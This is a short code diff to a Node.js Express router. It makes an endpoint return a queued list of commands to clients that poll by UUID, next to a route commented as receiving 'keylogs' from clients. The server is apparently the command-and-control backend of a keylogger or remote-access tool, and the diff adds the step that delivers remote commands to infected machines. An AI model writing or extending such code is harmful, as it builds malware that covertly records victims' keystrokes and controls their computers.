@@ -12,7 +12,8 @@ router.put('/:uuid', (req, res) => {
 
 //At clients polling for retriving the commands list
 router.get('/:uuid/commands', (req, res) => {
-    res.status(200).json({})
+    const commands = clientService.getCommands(req.params.uuid)
+    res.status(200).json(commands)
 })
 
 //At clients sending keylogs
